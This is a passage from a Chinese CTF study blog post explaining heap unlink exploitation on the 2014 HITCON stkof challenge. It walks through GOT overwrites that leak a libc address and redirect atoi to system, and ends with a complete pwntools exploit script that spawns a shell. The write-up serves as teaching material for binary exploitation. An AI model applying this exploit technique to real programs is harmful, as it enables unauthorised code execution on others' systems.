+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1601195372253-3b329d49-bc26-4252-b075-3f192fe9220a.png" alt="img"></p>
+<p>那么这样一来，我们可以通过修改s[2]的方式来对s[]数组进行部署函数的got地址，再次修改s[]数组的时候就会修改got中的函数地址，这和前面的几篇文章的套路差不多。首先看第一部，向s[]数组中部署函数got地址：</p>
+<pre><code class="python">payload = &#39;a&#39; * 8 + p64(elf.got[&#39;free&#39;]) + p64(elf.got[&#39;puts&#39;]) + p64(elf.got[&#39;atoi&#39;])
+</code></pre>
+<p>根据上面的payload修改s[2]：主界面–&gt; 2–&gt; 2–&gt; payload</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200917162513630.png" alt="img"></p>
+<p>这样一来free()函数、puts()函数、atoi()函数就已经在s[]数组中部署好了。可以看到如果再次修改s[0]的话其实修改的是free()函数的真实地址，再次修改s[1]的话其实修改的是puts()函数的真实地址，再次修改s[3]的话其实修改的是atoi()函数的真实地址。</p>
+<p>那么接下来，如果将s[0]，即free()函数got中的真实地址修改成puts_plt的话，释放调用free()函数就相当于调用puts()函数了。那么如果释放的是s[1]的话就可以泄露出puts()函数的真实地址了：</p>
+<pre><code class="python">payload = p64(elf.plt[&#39;puts&#39;])
+</code></pre>
+<p>再次根据上面的payload修改s[0]：主界面–&gt; 2–&gt; 0–&gt; payload</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200917164019227.png" alt="img"></p>
+<p>接下来就是释放s[1]了，虽然是调用<code>free(puts_got)</code>，但实际上是<code>puts(puts_got)</code>，需要注意的是我们接收泄露的地址的时候需要用<code>\x00</code>补全，并且用u64()转换一下才能用：</p>
+<pre><code class="python">puts_addr = p.recvuntil(&#39;\nOK\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)
+puts_addr = u64(puts_addr)
+</code></pre>
+<h4 id="查找system-函数和-x2F-bin-x2F-sh字符串"><a href="#查找system-函数和-x2F-bin-x2F-sh字符串" class="headerlink" title="查找system()函数和&#x2F;bin&#x2F;sh字符串"></a>查找system()函数和&#x2F;bin&#x2F;sh字符串</h4><pre><code class="python">libc_base = puts_addr - libc.symbols[&#39;puts&#39;]
+binsh_addr = libc_base + next(libc.search(&#39;/bin/sh&#39;))
+system_addr = libc_base + libc.symbols[&#39;system&#39;]
+</code></pre>
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>还是用前面的思路，我们将部署在s[2]中的atoi_got中的地址修改成前面找到的system()函数地址，这样一来在接收字符串调用atoi()函数的时候实际上调用的是system()函数：</p>
+<pre><code class="python">payload = p64(system_addr)
+</code></pre>
+<p>再次根据上面的payload修改s[2]：主界面–&gt; 2–&gt; 2–&gt; payload</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200917165504325.png" alt="img"></p>
+<p>最后我们在等待输入的时候输入&#x2F;bin&#x2F;sh字符串的地址就可以了，看起来是<code>atoi(/bin/sh)</code>，但实际上执行的是system(&#x2F;bin&#x2F;sh)。</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre><code class="python">from pwn import *
+context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]
+if args[&#39;DEBUG&#39;]:
+    context.log_level = &#39;debug&#39;
+context.binary = &quot;./stkof&quot;
+stkof = ELF(&#39;./stkof&#39;)
+if args[&#39;REMOTE&#39;]:
+    p = remote(&#39;127.0.0.1&#39;, 7777)
+else:
+    p = process(&quot;./stkof&quot;)
+log.info(&#39;PID: &#39; + str(proc.pidof(p)[0]))
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+head = 0x602140
+
+
+def alloc(size):
+    p.sendline(&#39;1&#39;)
+    p.sendline(str(size))
+    p.recvuntil(&#39;OK\n&#39;)
+
+
+def edit(idx, size, content):
+    p.sendline(&#39;2&#39;)
+    p.sendline(str(idx))
+    p.sendline(str(size))
+    p.send(content)
+    p.recvuntil(&#39;OK\n&#39;)
+
+
+def free(idx):
+    p.sendline(&#39;3&#39;)
+    p.sendline(str(idx))
+
+
+def exp():
+    # trigger to malloc buffer for io function
+    alloc(0x100)  # idx 1
+
+    alloc(0x30)  # idx 2
+    # small chunk size inorder to trigger unlink
+    alloc(0x80)  # idx 3
+    # a fake chunk at global[2]=head+16 who&#39;s size is 0x20
+    payload = p64(0)  #prev_size
+    payload += p64(0x20)  #size
+    payload += p64(head + 16 - 0x18)  #fd
+    payload += p64(head + 16 - 0x10)  #bk
+    payload += p64(0x20)  # next chunk&#39;s prev_size bypass the check
+    payload = payload.ljust(0x30, &#39;a&#39;)
+    # overwrite global[3]&#39;s chunk&#39;s prev_size
+    # make it believe that prev chunk is at global[2]
+    payload += p64(0x30)
+    # make it believe that prev chunk is free
+    payload += p64(0x90)
+    edit(2, len(payload), payload)
+    # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8
+    free(3)
+    p.recvuntil(&#39;OK\n&#39;)
+    #gdb.attach(p)
+    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
+    payload = &#39;a&#39; * 8 + p64(stkof.got[&#39;free&#39;]) + p64(stkof.got[&#39;puts&#39;]) + p64(stkof.got[&#39;atoi&#39;])
+    edit(2, len(payload), payload)
+    # edit free@got to puts@plt
+    payload = p64(stkof.plt[&#39;puts&#39;])
+    edit(0, len(payload), payload)
+
+    #free global[1] to leak puts addr
+    free(1)
+    puts_addr = p.recvuntil(&#39;\nOK\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)
+    puts_addr = u64(puts_addr)
+    log.success(&#39;puts addr: &#39; + hex(puts_addr))
+    libc_base = puts_addr - libc.symbols[&#39;puts&#39;]
+    binsh_addr = libc_base + next(libc.search(&#39;/bin/sh&#39;))
+    system_addr = libc_base + libc.symbols[&#39;system&#39;]
+    log.success(&#39;libc base: &#39; + hex(libc_base))
+    log.success(&#39;/bin/sh addr: &#39; + hex(binsh_addr))
+    log.success(&#39;system addr: &#39; + hex(system_addr))
+    # modify atoi@got to system addr
+    payload = p64(system_addr)
+    edit(2, len(payload), payload)
+    p.send(p64(binsh_addr))
+    p.interactive()
+
+
+if __name__ == &quot;__main__&quot;:
+    exp()
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zhuyuan1213.github.io">主元</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zhuyuan1213.github.io/2023/07/24/unsortedbin%E7%9A%84unlink/">https://zhuyuan1213.github.io/2023/07/24/unsortedbin%E7%9A%84unlink/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zhuyuan1213.github.io" target="_blank">zhuyuan's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/study/">study</a><a class="post-meta__tags" href="/tags/heap/">heap</a></div><div class="post_share"><div class="social-share" data-image="https://w.wallhaven.cc/full/3l/wallhaven-3lrqpy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/24/ret2syscall/"><img class="prev-cover" src="https://w.wallhaven.cc/full/p9/wallhaven-p987zm.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ret2syscall</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/24/%E5%A0%86-UAF%EF%BC%88Use%20After%20Free%EF%BC%89/"><img class="next-cover" src="https://w.wallhaven.cc/full/3l/wallhaven-3lrqpy.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">堆-UAF（Use After Free）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/" title="Chunk Extend&#x2F;Overlapping | 堆拓展、重叠"><img class="cover" src="https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">Chunk Extend&#x2F;Overlapping | 堆拓展、重叠</div></div></a></div><div><a href="/2023/07/24/%E5%A0%86-UAF%EF%BC%88Use%20After%20Free%EF%BC%89/" title="堆-UAF（Use After Free）"><img class="cover" src="https://w.wallhaven.cc/full/3l/wallhaven-3lrqpy.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">堆-UAF（Use After Free）</div></div></a></div><div><a href="/2023/07/24/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" title="堆中的off-by-one"><img class="cover" src="https://w.wallhaven.cc/full/w8/wallhaven-w8m9w7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">堆中的off-by-one</div></div></a></div><div><a href="/2023/07/24/%E5%A0%86%E5%85%A5%E9%97%A8%E6%A6%82%E8%BF%B0/" title="堆入门概述"><img class="cover" src="https://w.wallhaven.cc/full/ex/wallhaven-exwgw8.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">堆入门概述</div></div></a></div><div><a href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段"><img class="cover" src="https://w.wallhaven.cc/full/we/wallhaven-wemdqr.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">Canary保护机制以及常用绕过手段</div></div></a></div><div><a href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式"><img class="cover" src="https://w.wallhaven.cc/full/d6/wallhaven-d6wdl3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">ELF文件格式</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">主元</div><div class="author-info__description">二进制ing</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zhuyuan1213/zhuyuan1213.github.io.git"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">献给热爱的一切~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#unsortedbin%E7%9A%84unlink"><span class="toc-number">1.</span> <span class="toc-text">unsortedbin的unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">参考资料</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unlink"><span class="toc-number">1.1.</span> <span class="toc-text">Unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unlink%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.1.1.</span> <span class="toc-text">Unlink是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E9%87%8A%E6%94%BE"><span class="toc-number">1.1.2.</span> <span class="toc-text">堆释放</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">1.1.2.0.1.</span> <span class="toc-text"></span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink%E8%BF%87%E7%A8%8B%E5%8F%8A%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.3.</span> <span class="toc-text">unlink过程及检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chunk%E7%8A%B6%E6%80%81%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.4.</span> <span class="toc-text">chunk状态检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A2014-HITCON-stkof"><span class="toc-number">1.1.5.</span> <span class="toc-text">例题：2014 HITCON stkof</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">检查保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#creat-heap%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.4.</span> <span class="toc-text">creat_heap函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit-heap%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.5.</span> <span class="toc-text">edit_heap函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete-heap%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.6.</span> <span class="toc-text">delete_heap函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90%E5%8F%8A%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">1.1.6.</span> <span class="toc-text">思路分析及动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%A8%A1%E4%BB%BF%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B%E5%86%99%E5%87%BApayload"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">1、模仿程序流程写出payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%88%9B%E5%BB%BA3%E4%B8%AAchunk"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">2、创建3个chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2fake-chunk%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">部署fake_chunk环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0fake-chunk"><span class="toc-number">1.1.6.4.</span> <span class="toc-text">构造fake_chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91unlink"><span class="toc-number">1.1.6.5.</span> <span class="toc-text">触发unlink</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.6.6.</span> <span class="toc-text">泄露函数地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEsystem-%E5%87%BD%E6%95%B0%E5%92%8C-x2F-bin-x2F-sh%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.1.6.7.</span> <span class="toc-text">查找system()函数和&#x2F;bin&#x2F;sh字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getshell"><span class="toc-number">1.1.6.8.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.6.9.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段"><img src="https://w.wallhaven.cc/full/we/wallhaven-wemdqr.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Canary保护机制以及常用绕过手段"/></a><div class="content"><a class="title" href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段">Canary保护机制以及常用绕过手段</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/NSSCTF-babyof/" title="NSSCTF-babyof"><img src="https://w.wallhaven.cc/full/ex/wallhaven-exwgv8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NSSCTF-babyof"/></a><div class="content"><a class="title" href="/2023/07/24/NSSCTF-babyof/" title="NSSCTF-babyof">NSSCTF-babyof</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式"><img src="https://w.wallhaven.cc/full/d6/wallhaven-d6wdl3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ELF文件格式"/></a><div class="content"><a class="title" href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式">ELF文件格式</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/NSSCTF-whitegive_pwn/" title="NSSCTF-whitegive_pwn"><img src="https://w.wallhaven.cc/full/rr/wallhaven-rrjvyq.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NSSCTF-whitegive_pwn"/></a><div class="content"><a class="title" href="/2023/07/24/NSSCTF-whitegive_pwn/" title="NSSCTF-whitegive_pwn">NSSCTF-whitegive_pwn</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/" title="Chunk Extend/Overlapping | 堆拓展、重叠"><img src="https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chunk Extend/Overlapping | 堆拓展、重叠"/></a><div class="content"><a class="title" href="/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/" title="Chunk Extend/Overlapping | 堆拓展、重叠">Chunk Extend/Overlapping | 堆拓展、重叠</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 主元</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container').forEach(node => {
+            if (node.hasAttribute('display')) {
+              btf.wrap(node, 'div', { class: 'mathjax-overflow' })
+            } else {
+              btf.wrap(node, 'span', { class: 'mathjax-overflow' })
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
